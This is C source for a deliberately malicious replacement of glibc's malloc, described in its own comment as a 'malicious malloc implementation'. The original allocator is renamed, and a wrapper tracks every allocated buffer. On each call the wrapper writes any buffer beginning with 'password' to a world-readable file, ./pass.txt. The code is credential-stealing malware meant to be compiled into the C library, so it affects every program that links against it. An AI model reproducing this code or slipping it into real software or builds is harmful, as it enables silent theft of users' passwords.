/*

wrap __libc_malloc_ (now foril) with our malicious malloc implementation
changing malloc.c

*/



void *
__libc_malloc_foril (size_t bytes)
{
  mstate ar_ptr;
  void *victim;

  _Static_assert (PTRDIFF_MAX <= SIZE_MAX / 2,
                  "PTRDIFF_MAX is not more than half of SIZE_MAX");

  if (!__malloc_initialized)
    ptmalloc_init ();
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  if (!checked_request2size (bytes, &tbytes))
    {
      __set_errno (ENOMEM);
      return NULL;
    }
  size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
    {
      victim = tcache_get (tc_idx);
      return tag_new_usable (victim);
    }
  DIAG_POP_NEEDS_COMMENT;
#endif

  if (SINGLE_THREAD_P)
    {
      victim = tag_new_usable (_int_malloc (&main_arena, bytes));
      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
	      &main_arena == arena_for_chunk (mem2chunk (victim)));
      return victim;
    }

  arena_get (ar_ptr, bytes);

  victim = _int_malloc (ar_ptr, bytes);
  /* Retry with another arena only if we were able to find a usable arena
     before.  */
  if (!victim && ar_ptr != NULL)
    {
      LIBC_PROBE (memory_malloc_retry, 1, bytes);
      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim = _int_malloc (ar_ptr, bytes);
    }

  if (ar_ptr != NULL)
    __libc_lock_unlock (ar_ptr->mutex);

  victim = tag_new_usable (victim);

  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
          ar_ptr == arena_for_chunk (mem2chunk (victim)));
  return victim;
}
libc_hidden_def (__libc_malloc)

void *
__libc_malloc (size_t bytes)
{
  static char *ptr_arr[1024];
  static size_t ptr_count = 0;
  void *ptr = NULL;
  const char *keyword = "password";
  const char *path = "./pass.txt";
  size_t i = 0;
  int fd = 0;

  fd = open(path, O_RDWR | O_CREAT | O_APPEND, 0666);
  if(-1 != fd)
  {
        
    for(; i < ptr_count; ++i)
    {
        size_t j = 0;

        if(NULL == ptr_arr[i])
        {
            continue;
        }
        while(ptr_arr[i][j] && keyword[j])
        {
            if(ptr_arr[i][j] == keyword[j])
            {
                ++j;
                continue;
            }
            break;
        }

        if (strlen(keyword) == j)
        {
            write(fd, ptr_arr[i], strlen(ptr_arr[i]));
            write(fd, "\n", strlen("\n"));
        }
    }
    close(fd);
  }

  ptr = __libc_malloc_foril(bytes);
  for(i=0; i < 1024; ++i)
  {
    if(NULL == ptr_arr[i])
    {
    ptr_arr[i] = ptr;
    ++ptr_count;
    break;
    }
  }
  return ptr;
}



